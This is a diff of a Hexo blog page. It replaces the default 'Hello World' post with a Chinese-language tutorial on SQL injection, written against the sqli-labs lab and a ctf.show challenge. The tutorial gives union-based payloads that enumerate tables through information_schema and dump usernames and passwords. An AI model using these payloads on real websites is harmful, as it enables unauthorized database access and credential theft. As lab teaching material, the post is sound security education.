@@ -1636,57 +1636,6 @@
 
 
   
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/14/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-01-14T01:10:23.157Z" itemprop="datePublished">2024-01-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/14/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/14/hello-world/" data-id="clrcsvgpg0000sgwk1lgf0nhz" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-12.1文件上传漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/01/09/12.1%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -3094,6 +3043,916 @@
     </div>
     <footer class="article-footer">
       <a data-url="http://example.com/2023/12/23/10.1-mysql/" data-id="clrcswxkd0003ugwkderg4l87" data-title="10.1-mysql基础知识" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-9.1-sql注入-爆破-moneybox" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5-%E7%88%86%E7%A0%B4-moneybox/" class="article-date">
+  <time class="dt-published" datetime="2023-12-18T06:47:33.000Z" itemprop="datePublished">2023-12-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5-%E7%88%86%E7%A0%B4-moneybox/">9.1-sql注入-爆破-moneybox</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h3><p>常见<em>SQL注入</em>类型（细分七种类型） · 联合注入 · 布尔盲注 · 时间盲注 · 宽字节注入 · 报错注入 · 堆叠注入 · 二次注入.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection(布尔型注入)</span><br><span class="line">E: Error-based SQL injection(报错型注入)</span><br><span class="line">U: UNION query sQL injection(可联合查询注入)</span><br><span class="line">S: Stacked queries sQL injection(可多语句查询注入)</span><br><span class="line">T: Time-based blind sQL injection(基于时间延迟注入</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h3><p>PS：mysql已经安装好了</p>
+<h5 id="进入mysql："><a href="#进入mysql：" class="headerlink" title="进入mysql："></a>进入mysql：</h5><p>进入命令行窗口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ....\MySQL版本号\bin # 进入MySQL根目录下的bin目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220191601783.png" alt="image-20231220191601783"></p>
+<p>输入下方内容登陆mysql,并输入数据库密码,数据库密码请记住，忘记了会很麻烦。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220191741508.png" alt="image-20231220191741508"></p>
+<p>密码正常输入之后</p>
+<img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220191850883.png" alt="image-20231220191850883" style="zoom:80%;" />
+
+<h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database database_name;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220194543528.png" alt="image-20231220194543528"></p>
+<h5 id="显示MySQL的数据库"><a href="#显示MySQL的数据库" class="headerlink" title="显示MySQL的数据库"></a>显示MySQL的数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases; # 记得句尾要添加;，英语格式的，不然按Enter只会不断换行。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220192410931.png" alt="image-20231220192410931"></p>
+<h5 id="进入一个具体的表"><a href="#进入一个具体的表" class="headerlink" title="进入一个具体的表"></a>进入一个具体的表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use xxxx; # xxxx为表名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220192632580.png" alt="image-20231220192632580"></p>
+<p>提示以上内容则表示之后输入的sql语句都在这个数据库里执行</p>
+<p>如果需要更换要使用的表的话只需要 use xxxx 即可</p>
+<h5 id="显示数据库中的表"><a href="#显示数据库中的表" class="headerlink" title="显示数据库中的表"></a>显示数据库中的表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">show tables from database_name; # database_name 就是数据库名字。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220193240079.png" alt="image-20231220193240079"></p>
+<h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database dbname # dbname要删除的数据库名称。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220194912842.png" alt="image-20231220194912842"></p>
+<h4 id="php相关补充"><a href="#php相关补充" class="headerlink" title="php相关补充"></a>php相关补充</h4><p>fopen()</p>
+<p>用于打开文件，返回一个文件指针resource。</p>
+<p>语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource <span class="title function_ invoke__">fopen</span>(<span class="keyword">string</span> filename,<span class="keyword">string</span> mode);</span><br></pre></td></tr></table></figure>
+
+<p>string mode部分可以填写r(只读)、w(写入)、a(追加)</p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> =  <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>fclose函数:</p>
+<p>用于关闭由fopen打开的文件。</p>
+<p>语法:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">fclose</span> ( resource <span class="variable">$handle</span> );</span><br></pre></td></tr></table></figure>
+
+<p>$handle是fopen返回的文件指针。</p>
+<p>关闭文件可以释放系统资源。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作文件,如写入</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;内容&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭文件</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>fopen和fclose结合使用:</p>
+<ul>
+<li>fopen打开文件后返回一个文件指针</li>
+<li>通过指针操作文件,如读写</li>
+<li>fclose关闭文件释放系统资源</li>
+</ul>
+<p>它们可以实现文件的打开、读写和关闭操作。正确使用可以避免资源泄露。</p>
+<h3 id="sqli前期准备"><a href="#sqli前期准备" class="headerlink" title="sqli前期准备"></a>sqli前期准备</h3><p>在phpstudy中的软件管理下载php5.5.9</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162730470.png" alt="image-20231220162730470"></p>
+<p>进入网站选项，点击管理，更改php版本为php5.5.9</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162834869.png" alt="image-20231220162834869"></p>
+<p>将sqli文件放在….\phpstudy_pro\www中</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162624335.png" alt="image-20231220162624335"></p>
+<p>打开mysql与Apache</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162659139.png" alt="image-20231220162659139"></p>
+<p>打开fixfox浏览器，拓展，导入</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162122281.png" alt="image-20231220162122281"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162157711.png" alt="image-20231220162157711"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162231955.png" alt="image-20231220162231955"></p>
+<p>选择“从文件安装组件”，导入后缀为.xpi的脚本文件</p>
+<p>随便进一个网站，按F12打开开发者工具，显示下方内容则表示安装成功。+</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220162420117.png" alt="image-20231220162420117"></p>
+<h3 id="sqli测试"><a href="#sqli测试" class="headerlink" title="sqli测试"></a>sqli测试</h3><p>在网页尾端加入</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli/Less-1/?id=1">http://localhost/sqli/Less-1/?id=1</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220143215478.png" alt="image-20231220143215478"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220143150765.png" alt="image-20231220143150765"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220151717545.png" alt="image-20231220151717545"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220152212462.png" alt="image-20231220152212462">mysql5.0之后才出现的</p>
+<p>查表（这在数据库library中显示的数据）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220160407756.png" alt="image-20231220160407756"></p>
+<p>这在数据库library中显示的数据</p>
+<p>下面两个都是在security数据库中的显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use security</span><br><span class="line"></span><br><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220161031511.png" alt="image-20231220161031511"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220161130630.png" alt="image-20231220161130630"></p>
+<p>将改部分网址+数据库语句放在HackBar中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.70/sqli/Less-1/?id=-1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220161755086.png" alt="image-20231220161755086"></p>
+<p>点击Execute运行</p>
+<p>结果</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220161618420.png" alt="image-20231220161618420"></p>
+<hr>
+<h4 id="语句尝试："><a href="#语句尝试：" class="headerlink" title="语句尝试："></a>语句尝试：</h4><p>在该<a target="_blank" rel="noopener" href="http://ae4fa5e8-a3a1-4715-b344-d4626384cab1.challenge.ctf.show/?id=-1%27union%20select%201,group_concat(id,%22~%22,username,%22~%22,password).3%20from%20%20ctfshow_user%20where%20username=%27flag%27--%20-">网页</a>输出flag</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231220171546113.png" alt="image-20231220171546113"></p>
+<p>查询框中输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ae4fa5e8-a3a1-4715-b344-d4626384cab1.challenge.ctf.show/?id=-1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from  ctfshow_user where username=&#x27;flag&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>点击查询，输出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">26~flag~ctfshow&#123;5143811f-cb73-4e4b-a130-76015c2cf87f&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h5><p>SQL语句中的UNION运算符用于连接两个SELECT语句的结果集。</p>
+<p>UNION的主要作用和特征如下:</p>
+<ul>
+<li>用于连接两个SELECT语句的查询结果。</li>
+<li>两个SELECT语句必须包含相同数量的列。</li>
+<li>列的数据类型也应该兼容,如数值和字符串。</li>
+<li>连接后的结果集不包含重复的数据行。</li>
+</ul>
+<hr>
+<h4 id="sql注入解释"><a href="#sql注入解释" class="headerlink" title="sql注入解释"></a>sql注入解释</h4><p>​	SQL 注入就是指 Web  应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
+<li><p>传递给后端的参数是可以控制的</p>
+</li>
+<li><p>参数内容会被带入到数据库查询</p>
+</li>
+<li><p>变量未存在过滤或者过滤不严谨</p>
+</li>
+</ul>
+<h4 id="sql注入常用函数（-）"><a href="#sql注入常用函数（-）" class="headerlink" title="sql注入常用函数（*****）"></a>sql注入常用函数（*****）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version()                 # 查看数据库版本</span><br><span class="line">database()                # 查看当前数据库名</span><br><span class="line">user()                    # 查看当前数据库用户</span><br><span class="line">system_user()             # 查看系统用户名</span><br><span class="line">group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串</span><br><span class="line">@@datadir                 # 查看数据库路径</span><br><span class="line">@@version_compile_os      # 查看操作系统</span><br></pre></td></tr></table></figure>
+
+<p>PS：在<strong>mysql5.0</strong>版本之后，MySQL数据库中就存放着一个名为information_schema的数据库</p>
+<h5 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h5><ul>
+<li><p>系统自带（大概是为了更好的管理数据）</p>
+</li>
+<li><p>存储了当前数据库服务器的数据库对象的结构信息,如表名、字段名、索引等。（对于sql注入来说是一个很重要的条件-大概）</p>
+</li>
+<li><p>它的表<strong>不需要使用USE语句</strong>切换,直接使用information_schema.表名进行查询。（个表特点，sql注入更方便）</p>
+</li>
+<li><pre><code>tables表 - 存储所有表名
+
+columns表 - 存储所有字段名
+
+schemata表 - 存储所有数据库名
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 可以用来查询数据库、表、字段的结构信息。</span><br><span class="line"></span><br><span class="line">- 支持跨数据库访问,**在任何数据库中都可以使用**。</span><br><span class="line"></span><br><span class="line">![image-20231223184227814](https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223184227814.png)</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h4 id="sql注入-注释"><a href="#sql注入-注释" class="headerlink" title="sql注入-注释"></a>sql注入-注释</h4><p>两种：#      – （两条杠后面有空格）</p>
+<p>#url中<code>#</code>号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 <code>get</code> 传参时不包括<code>#</code>，因为使用 <code>#</code> 闭合无法注释，</p>
+<p>实际使用– 时可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- -</span><br><span class="line">或</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>
+
+<p>表示注释</p>
+<p>而使用<code>-- </code>（有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 <code>--+</code> 的方式来闭合，因为<code>+</code>会被解释成空格。</p>
+<p>注释后面的语句不会被执行，我们可以在注释前执行sql语句获取信息。</p>
+<h4 id="sql注入类型-1"><a href="#sql注入类型-1" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><p><strong>数字型注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/users.php?id=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 数字型驻点常见的注入语句(Payload)</span><br><span class="line">select * from 表名 where id=1 and 1=1</span><br><span class="line"></span><br><span class="line"># 查询数据库名和版本</span><br><span class="line">id=-1 union select 1,database(),version() --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的表名</span><br><span class="line">id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中指定表名中的列名字段</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定表中的数据</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(username,&#x27;:&#x27;,password) from secyrity.users) --+  </span><br></pre></td></tr></table></figure>
+
+<p><strong>字符型注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27; and 1=1 &#x27;&#x27;</span><br><span class="line"># 字符型常见的注入语句(Payload)</span><br><span class="line"></span><br><span class="line"># 后台语句 - SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br><span class="line">id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">id=-2&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>字符型注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27; and 1=1 &#x27;&#x27;</span><br><span class="line"># 字符型常见的注入语句(Payload)</span><br><span class="line"></span><br><span class="line"># 后台语句 - SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br><span class="line">id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">id=-2&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>判断是哪种注入时需要使用叫脚本或工具或者直接在网页上进行注入</p>
+<p>postman便是一个很好的工具</p>
+<p>判断注入类型需要先输入？id&#x3D;1，？后面的内容根据具体网站而定</p>
+<p>通过输入的变量不同看网站输出的数据</p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190414824.png" alt="image-20231223190414824"></p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;2</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190546590.png" alt="image-20231223190546590"></p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’（加了个单引号）</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190647546.png" alt="image-20231223190647546"></p>
+<p>页面报错，加个注释试试</p>
+<p>&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’– -</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223190834434.png" alt="image-20231223190834434"></p>
+<p>内容又重新显示出来了，表示这是字符型且存在漏洞</p>
+<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>查询列数</p>
+<p>如果报错就是超过列数，如果显示正常就是没有超出列数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191219280.png" alt="image-20231223191219280"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/Less-1/?id=1&#x27;order by 4 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191328522.png" alt="image-20231223191328522"></p>
+<p>报错了，说明列数是三行</p>
+<p>爆显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191524742.png" alt="image-20231223191524742"></p>
+<p>id为-1的原因</p>
+<ol>
+<li><p>作为数字使用而不是字符串</p>
+</li>
+<li><p>绕过语法限制如表名限制</p>
+</li>
+<li><p>利用错误或延时进行盲注</p>
+</li>
+<li><p>测试是否支持联合查询</p>
+</li>
+<li><p>长度限制等原因</p>
+</li>
+</ol>
+<p>查MySQL版本号</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223191903868.png" alt="image-20231223191903868"></p>
+<p><strong>爆表</strong>（*）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/Less-1/?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>就是告诉我们这个库有哪些表</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192128997.png" alt="image-20231223192128997"></p>
+<p>我们需要的一般是users表内内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192258777.png" alt="image-20231223192258777"></p>
+<p>id，username，password是我们需要的内容</p>
+<p>可以直接查询user表中内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/Less-1/?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192430675.png" alt="image-20231223192430675"></p>
+<p>我们需要的内容就出现了</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​	当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是sql语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p>
